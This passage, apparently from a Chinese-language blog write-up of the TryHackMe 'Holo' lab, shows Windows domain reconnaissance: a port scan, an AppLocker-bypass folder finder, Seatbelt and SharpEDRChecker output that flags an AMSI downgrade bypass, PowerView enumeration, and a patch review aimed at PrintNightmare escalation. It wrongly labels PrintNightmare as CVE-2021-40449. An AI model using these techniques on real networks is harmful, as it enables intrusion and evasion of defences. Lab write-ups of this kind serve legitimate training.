+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux-admin@ip-10-200-112-33:~$ <span class="hljs-built_in">nohup</span> nc -zv 10.200.112.35 1-65535<br>linux-admin@ip-10-200-112-33:~$ <span class="hljs-built_in">cat</span> nohup.out | grep succeeded<br>Connection to 10.200.112.35 80 port [tcp/http] succeeded!<br>Connection to 10.200.112.35 135 port [tcp/epmap] succeeded!<br>Connection to 10.200.112.35 139 port [tcp/netbios-ssn] succeeded!<br>Connection to 10.200.112.35 3389 port [tcp/ms-wbt-server] succeeded!<br>Connection to 10.200.112.35 5985 port [tcp/*] succeeded!<br>Connection to 10.200.112.35 47001 port [tcp/*] succeeded!<br>Connection to 10.200.112.35 49664 port [tcp/*] succeeded!<br>Connection to 10.200.112.35 49665 port [tcp/*] succeeded!<br>Connection to 10.200.112.35 49666 port [tcp/*] succeeded!<br>Connection to 10.200.112.35 49667 port [tcp/*] succeeded!<br>Connection to 10.200.112.35 49668 port [tcp/*] succeeded!<br>Connection to 10.200.112.35 49669 port [tcp/*] succeeded!<br>Connection to 10.200.112.35 49671 port [tcp/*] succeeded!<br></code></pre></td></tr></table></figure>
+
+<p>看端口特征也是windows。80端口一个IIS的默认页面，没什么信息。winrm链接会发生错误，但是RDP是可以正常链接的，当然不能以域用户身份远程登录，而是需要用本地账户的身份才能登录成功：</p>
+<p><img src="https://www.worldisend.com/img/image-20220706184049511.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220706184049511"></p>
+<p>这台机器需要先绕过Applocker:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># AppLocker Bypass Checker (Default Rules) v2.0</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># One of the Default Rules in AppLocker allows everything in the folder C:\Windows to be executed.</span><br><span class="hljs-comment"># A normal user shouln&#x27;t have write permission in that folder, but that is not always the case.</span><br><span class="hljs-comment"># This script lists default ACL for the &quot;BUILTIN\users&quot; group looking for write/createFiles &amp; execute authorizations</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># @Author: Sparc Flow in &quot;How to Hack a Fashion Brand&quot;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># NOTE: change the group and root_folder variables to suit your needs</span><br><br><span class="hljs-variable">$group</span> = <span class="hljs-string">&quot;*Users*&quot;</span><br><span class="hljs-variable">$root_folder</span> = <span class="hljs-string">&quot;C:\windows&quot;</span><br><span class="hljs-built_in">write-output</span> <span class="hljs-string">&quot;[*] Processing folders recursively in <span class="hljs-variable">$root_folder</span>&quot;</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_</span> <span class="hljs-keyword">in</span> (<span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-variable">$root_folder</span> <span class="hljs-literal">-recurse</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_</span>.PSIsContainer)<br>    &#123;<br>		<span class="hljs-keyword">try</span>&#123;<br>			<span class="hljs-variable">$res</span> = <span class="hljs-built_in">Get-acl</span> <span class="hljs-variable">$_</span>.FullName <br>		&#125; <span class="hljs-keyword">catch</span>&#123;<br>			<span class="hljs-keyword">continue</span><br>		&#125;<br>		<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$res</span>.access)&#123;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>.IdentityReference <span class="hljs-operator">-like</span> <span class="hljs-variable">$group</span>)&#123;<br>				<span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$a</span>.FileSystemRights <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*Write*&quot;</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$a</span>.FileSystemRights <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*CreateFiles*&quot;</span> ) <span class="hljs-operator">-and</span> <span class="hljs-variable">$a</span>.FileSystemRights <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*ReadAndExecute*&quot;</span> )&#123;<br>					<span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;[+] &quot;</span> <span class="hljs-variable">$_</span>.FullName <span class="hljs-literal">-foregroundcolor</span> <span class="hljs-string">&quot;green&quot;</span><br>				&#125;<br>				<br>			&#125;<br>		&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\watamet\Documents&gt; .\abc.ps1<br>[*] Processing folders recursively <span class="hljs-keyword">in</span> C:\windows<br>[+]  C:\windows\Tasks<br>[+]  C:\windows\tracing<br>[+]  C:\windows\System32\spool\drivers\color<br>[+]  C:\windows\tracing\ProcessMonitor<br></code></pre></td></tr></table></figure>
+
+<p>然后利用VS从编译exe上传到目标中：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/GhostPack/</span>Seatbelt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将涵盖检查 AV 的扫描</span><br>Seatbelt.exe -group=system<br><span class="hljs-comment">#会做一个远程检查…</span><br>Seatbelt.exe -group=remote -computername=PC-FILESRV01 -username=holo.live\watamet -password=Nothingtoworry!<br></code></pre></td></tr></table></figure>
+
+<p>还有监测EDR：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/PwnDexter/</span>SharpEDRChecker<br></code></pre></td></tr></table></figure>
+
+<p>运行所有检测,结果视当前用户权限决定：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">.\SharpEDRChecker<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bat">====== PowerShell ======<br><br>Installed CLR Versions<br><span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">30319</span><br><br>Installed PowerShell Versions<br><span class="hljs-number">2</span>.<span class="hljs-number">0</span><br>[!] Version <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">50727</span> of the CLR is <span class="hljs-keyword">not</span> installed - PowerShell v2.<span class="hljs-number">0</span> won&#x27;t be able to run.<br><span class="hljs-number">5</span>.<span class="hljs-number">1</span>.<span class="hljs-number">17763</span>.<span class="hljs-number">1</span><br><br>Transcription Logging Settings<br>Enabled : False<br>Invocation Logging : False<br>Log Directory :<br><br>Module Logging Settings<br>Enabled : False<br>Logged Module Names :<br><br>Script Block Logging Settings<br>Enabled : False<br>Invocation Logging : False<br><br>Anti-Malware Scan Interface (AMSI)<br>OS Supports AMSI: True<br>[!] You can <span class="hljs-keyword">do</span> a PowerShell version downgrade to bypass AMSI.<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bat">====== OSInfo ======<br><br>Hostname : PC-FILESRV01<br>Domain Name : holo.live<br>Username : HOLOLIVE\watamet<br>ProductName : Windows Server <span class="hljs-number">2019</span> Datacenter<br>EditionID : ServerDatacenter<br>ReleaseId : <span class="hljs-number">1809</span><br>Build : <span class="hljs-number">17763</span>.<span class="hljs-number">1577</span><br>BuildBranch : rs5_release<br>CurrentMajorVersionNumber : <span class="hljs-number">10</span><br>CurrentVersion : <span class="hljs-number">6</span>.<span class="hljs-number">3</span><br>Architecture : AMD64<br>ProcessorCount : <span class="hljs-number">1</span><br>IsVirtualMachine : True<br>BootTimeUtc (approx) : <span class="hljs-number">1</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">37</span>:<span class="hljs-number">50</span> PM (Total uptime: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">19</span>)<br>HighIntegrity : False<br>IsLocalAdmin : False<br>CurrentTimeUtc : <span class="hljs-number">1</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">50</span>:<span class="hljs-number">10</span> PM (Local <span class="hljs-built_in">time</span>: <span class="hljs-number">1</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">50</span>:<span class="hljs-number">10</span> PM)<br>TimeZone : Coordinated Universal <span class="hljs-built_in">Time</span><br>TimeZoneOffset : <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>InputLanguage : United Kingdom<br>InstalledInputLanguages : US, United Kingdom<br>MachineGuid : <span class="hljs-number">90</span>deb672-af9b-<span class="hljs-number">4</span>e3e-b275-<span class="hljs-number">6</span>e5f35440d1e<br></code></pre></td></tr></table></figure>
+
+<p><strong>What anti-malware product is employed on PC-FILESRV01?</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">AMSI</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What anti-virus product is employed on PC-FILESRV01?</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Windows Defender</span><br></code></pre></td></tr></table></figure>
+
+<p>然后是利用PowerView对内网主机信息的枚举：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\System32\spool\drivers\color&gt; <span class="hljs-built_in">Get-NetLocalGroup</span><br><br>ComputerName GroupName                           Comment<br><span class="hljs-literal">------------</span> <span class="hljs-literal">---------</span>                           <span class="hljs-literal">-------</span><br>PC<span class="hljs-literal">-FILESRV01</span> Access Control Assistance Operators Members of this <span class="hljs-built_in">group</span> can remotely query autho...<br>PC<span class="hljs-literal">-FILESRV01</span> Administrators                      Administrators have complete and unrestricted ...<br>PC<span class="hljs-literal">-FILESRV01</span> Backup Operators                    Backup Operators can override security restric...<br>PC<span class="hljs-literal">-FILESRV01</span> Certificate Service DCOM Access     Members of this <span class="hljs-built_in">group</span> are allowed to connect t...<br>PC<span class="hljs-literal">-FILESRV01</span> Cryptographic Operators             Members are authorized to perform cryptographi...<br>PC<span class="hljs-literal">-FILESRV01</span> Device Owners                       Members of this <span class="hljs-built_in">group</span> can change system<span class="hljs-literal">-wide</span> s...<br>PC<span class="hljs-literal">-FILESRV01</span> Distributed COM Users               Members are allowed to launch, activate and us...<br>PC<span class="hljs-literal">-FILESRV01</span> Event Log Readers                   Members of this <span class="hljs-built_in">group</span> can read event logs from...<br>PC<span class="hljs-literal">-FILESRV01</span> Guests                              Guests have the same access as members of the ...<br>PC<span class="hljs-literal">-FILESRV01</span> Hyper<span class="hljs-literal">-V</span> Administrators              Members of this <span class="hljs-built_in">group</span> have complete and unrest...<br>PC<span class="hljs-literal">-FILESRV01</span> IIS_IUSRS                           Built<span class="hljs-operator">-in</span> <span class="hljs-built_in">group</span> used by Internet Information Se...<br>PC<span class="hljs-literal">-FILESRV01</span> Network Configuration Operators     Members <span class="hljs-keyword">in</span> this <span class="hljs-built_in">group</span> can have some administra...<br>PC<span class="hljs-literal">-FILESRV01</span> Performance Log Users               Members of this <span class="hljs-built_in">group</span> may schedule logging of ...<br>PC<span class="hljs-literal">-FILESRV01</span> Performance Monitor Users           Members of this <span class="hljs-built_in">group</span> can access performance c...<br>PC<span class="hljs-literal">-FILESRV01</span> Power Users                         Power Users are included <span class="hljs-keyword">for</span> backwards compati...<br>PC<span class="hljs-literal">-FILESRV01</span> Print Operators                     Members can administer printers installed on d...<br>PC<span class="hljs-literal">-FILESRV01</span> RDS Endpoint Servers                Servers <span class="hljs-keyword">in</span> this <span class="hljs-built_in">group</span> run virtual machines and...<br>PC<span class="hljs-literal">-FILESRV01</span> RDS Management Servers              Servers <span class="hljs-keyword">in</span> this <span class="hljs-built_in">group</span> can perform routine admi...<br>PC<span class="hljs-literal">-FILESRV01</span> RDS Remote Access Servers           Servers <span class="hljs-keyword">in</span> this <span class="hljs-built_in">group</span> enable users of RemoteAp...<br>PC<span class="hljs-literal">-FILESRV01</span> Remote Desktop Users                Members <span class="hljs-keyword">in</span> this <span class="hljs-built_in">group</span> are granted the right to...<br>PC<span class="hljs-literal">-FILESRV01</span> Remote Management Users             Members of this <span class="hljs-built_in">group</span> can access WMI resources...<br>PC<span class="hljs-literal">-FILESRV01</span> Replicator                          Supports file replication <span class="hljs-keyword">in</span> a domain<br>PC<span class="hljs-literal">-FILESRV01</span> Storage Replica Administrators      Members of this <span class="hljs-built_in">group</span> have complete and unrest...<br>PC<span class="hljs-literal">-FILESRV01</span> System Managed Accounts <span class="hljs-built_in">Group</span>       Members of this <span class="hljs-built_in">group</span> are managed by the system.<br>PC<span class="hljs-literal">-FILESRV01</span> Users                               Users are prevented from making accidental or ...<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\System32\spool\drivers\color&gt; <span class="hljs-built_in">Get-NetLocalGroupMember</span> <span class="hljs-literal">-Group</span> Administrators<br><br>ComputerName : PC<span class="hljs-literal">-FILESRV01</span><br>GroupName    : Administrators<br>MemberName   : PC<span class="hljs-literal">-FILESRV01</span>\Administrator<br>SID          : S<span class="hljs-literal">-1-5-21-4241685735-4112329853-1893400299-500</span><br>IsGroup      : False<br>IsDomain     : False<br><br>ComputerName : PC<span class="hljs-literal">-FILESRV01</span><br>GroupName    : Administrators<br>MemberName   : HOLOLIVE\Domain Admins<br>SID          : S<span class="hljs-literal">-1-5-21-471847105-3603022926-1728018720-512</span><br>IsGroup      : True<br>IsDomain     : True<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\System32\spool\drivers\color&gt; <span class="hljs-built_in">Get-NetLoggedon</span><br><br>UserName     : watamet<br>LogonDomain  : HOLOLIVE<br>AuthDomains  :<br>LogonServer  : DC<span class="hljs-literal">-SRV01</span><br>ComputerName : localhost<br><br>UserName     : PC<span class="hljs-literal">-FILESRV01</span><span class="hljs-variable">$</span><br>LogonDomain  : HOLOLIVE<br>AuthDomains  :<br>LogonServer  :<br>ComputerName : localhost<br><br>UserName     : PC<span class="hljs-literal">-FILESRV01</span><span class="hljs-variable">$</span><br>LogonDomain  : HOLOLIVE<br>AuthDomains  :<br>LogonServer  :<br>ComputerName : localhost<br><br>UserName     : PC<span class="hljs-literal">-FILESRV01</span><span class="hljs-variable">$</span><br>LogonDomain  : HOLOLIVE<br>AuthDomains  :<br>LogonServer  :<br>ComputerName : localhost<br><br>UserName     : PC<span class="hljs-literal">-FILESRV01</span><span class="hljs-variable">$</span><br>LogonDomain  : HOLOLIVE<br>AuthDomains  :<br>LogonServer  :<br>ComputerName : localhost<br><br>UserName     : PC<span class="hljs-literal">-FILESRV01</span><span class="hljs-variable">$</span><br>LogonDomain  : HOLOLIVE<br>AuthDomains  :<br>LogonServer  :<br>ComputerName : localhost<br><br>UserName     : PC<span class="hljs-literal">-FILESRV01</span><span class="hljs-variable">$</span><br>LogonDomain  : HOLOLIVE<br>AuthDomains  :<br>LogonServer  :<br>ComputerName : localhost<br></code></pre></td></tr></table></figure>
+
+<p>提权根据目标最近更新的时间为2020/11/11，存在后续曝出的漏洞PrintNightmarePrintNightmare，低权限可安装系统驱动导致权限提升。该漏洞编号为cve_2021_40449，MSF内置集成。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\Windows\Tasks&gt; wmic qfe list<br>Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status<br>http://support.microsoft.com/?kbid=4580422  PC-FILESRV01  Update                        KB4580422               NT AUTHORITY\SYSTEM  11/11/2020<br>http://support.microsoft.com/?kbid=4470502  PC-FILESRV01  Update                        KB4470502               NT AUTHORITY\SYSTEM  12/12/2018<br>http://support.microsoft.com/?kbid=4470788  PC-FILESRV01  Security Update               KB4470788               NT AUTHORITY\SYSTEM  12/12/2018<br>http://support.microsoft.com/?kbid=4480056  PC-FILESRV01  Update                        KB4480056               NT AUTHORITY\SYSTEM  1/9/2019<br>http://support.microsoft.com/?kbid=4493510  PC-FILESRV01  Security Update               KB4493510               NT AUTHORITY\SYSTEM  4/21/2019<br>http://support.microsoft.com/?kbid=4494174  PC-FILESRV01  Update                        KB4494174               NT AUTHORITY\SYSTEM  3/18/2020<br>http://support.microsoft.com/?kbid=4499728  PC-FILESRV01  Security Update               KB4499728               NT AUTHORITY\SYSTEM  5/15/2019<br>http://support.microsoft.com/?kbid=4504369  PC-FILESRV01  Security Update               KB4504369               NT AUTHORITY\SYSTEM  6/12/2019<br>http://support.microsoft.com/?kbid=4512577  PC-FILESRV01  Security Update               KB4512577               NT AUTHORITY\SYSTEM  9/11/2019<br>http://support.microsoft.com/?kbid=4512937  PC-FILESRV01  Security Update               KB4512937               NT AUTHORITY\SYSTEM  9/6/2019<br>http://support.microsoft.com/?kbid=4521862  PC-FILESRV01  Security Update               KB4521862               NT AUTHORITY\SYSTEM  10/9/2019<br>http://support.microsoft.com/?kbid=4523204  PC-FILESRV01  Security Update               KB4523204               NT AUTHORITY\SYSTEM  11/13/2019<br>http://support.microsoft.com/?kbid=4539571  PC-FILESRV01  Security Update               KB4539571               NT AUTHORITY\SYSTEM  3/18/2020<br>http://support.microsoft.com/?kbid=4549947  PC-FILESRV01  Security Update               KB4549947               NT AUTHORITY\SYSTEM  4/15/2020<br>http://support.microsoft.com/?kbid=4558997  PC-FILESRV01  Security Update               KB4558997               NT AUTHORITY\SYSTEM  7/15/2020<br>http://support.microsoft.com/?kbid=4562562  PC-FILESRV01  Security Update               KB4562562               NT AUTHORITY\SYSTEM  6/10/2020<br>http://support.microsoft.com/?kbid=4566424  PC-FILESRV01  Security Update               KB4566424               NT AUTHORITY\SYSTEM  8/12/2020<br>http://support.microsoft.com/?kbid=4570332  PC-FILESRV01  Security Update               KB4570332               NT AUTHORITY\SYSTEM  9/9/2020<br>https://support.microsoft.com/help/4577667  PC-FILESRV01  Security Update               KB4577667               NT AUTHORITY\SYSTEM  10/14/2020<br>https://support.microsoft.com/help/4580325  PC-FILESRV01  Security Update               KB4580325               NT AUTHORITY\SYSTEM  10/14/2020<br>https://support.microsoft.com/help/4587735  PC-FILESRV01  Security Update               KB4587735               NT AUTHORITY\SYSTEM  11/11/2020<br>https://support.microsoft.com/help/4586793  PC-FILESRV01  Security Update               KB4586793               NT AUTHORITY\SYSTEM  11/11/2020<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">type</span> <span class="hljs-title">root.txt</span></span><br><span class="hljs-function"><span class="hljs-title">type</span> <span class="hljs-title">root.txt</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the first listed vulnerable DLL located in the Windows folder from the application</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">wow64log.dll<br></code></pre></td></tr></table></figure>
+
+<p>最后一台域控涉及了很多端口转发的操作，中途我忘记记录了。太繁琐，懒的再打一遍。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TryHackMe-Holo</div>
+      <div>http://example.com/2022/10/06/TryHackMe-Holo/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/MAC-Flooding-ARP-Spoofing/" title="MAC Flooding and ARP Spoofing">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">MAC Flooding and ARP Spoofing</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-Ra2/" title="TryHackMe-Ra2">
+                        <span class="hidden-mobile">TryHackMe-Ra2</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
